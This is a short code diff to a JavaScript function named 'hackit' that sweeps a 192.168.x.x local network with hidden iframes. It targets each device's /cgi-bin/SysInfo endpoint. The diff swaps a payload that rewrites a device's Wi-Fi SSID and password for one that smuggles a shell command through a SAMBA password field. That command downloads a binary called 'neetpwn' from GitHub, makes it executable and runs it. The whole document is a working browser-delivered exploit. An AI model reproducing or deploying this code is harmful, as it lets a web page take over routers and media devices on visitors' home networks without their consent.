@@ -38,7 +38,7 @@ function hackit(ip) {
     if ( octets[0].match(/192/) && octets[1].match(/168/) ) {
         for (i=2; i < 200 ; i++) {
             ifrm = document.createElement("iframe");
-            ifrm.setAttribute('src', 'http://'+network+'.'+i+'/cgi-bin/SysInfo?data=%3CsetSysInfo%3E%3CSSID%20name%3D%22bouncycastle%22%20encrypt%3D%22WPA%22%20channel%3D%22%22%20password%3D%22yoloswag%22%20encrypt_len%3D%22%22%20format%3D%22%22%20mac%3D%22845dd7a1c4a7%22%20tkip_aes%3D%22aes%22/%3E%3C/setSysInfo%3E&ts=1470931846464&data=%3CsetSysInfo%3E%3CSSID+name%3D%22 bouncycastle%22+encrypt%3D%22WPA%22+channel%3D%22%22+password%3D%22yoloswag%22+encrypt_len%3D%22%22+format%3D%22%22+mac%3D%22845dd7a1c4a7%22+tkip_aes%3D%22aes%22%2F%3E%3C%2FsetSysInfo%3E');
+            ifrm.setAttribute('src', 'http://'+network+'.'+i+'/cgi-bin/SysInfo?data=<setSysInfo><SAMBA user="user" password="x|wget https://raw.githubusercontent.com/MrTurvey/NeetAirstream/master/neetpwn; chmod 777 neetpwn; ./neetpwn||x" port="137" path="" status="" anonymous_en="" enable="OFF"></SAMBA></setSysInfo>#');
             ifrm.height=200;
             ifrm.width=200;
             document.body.appendChild(ifrm);
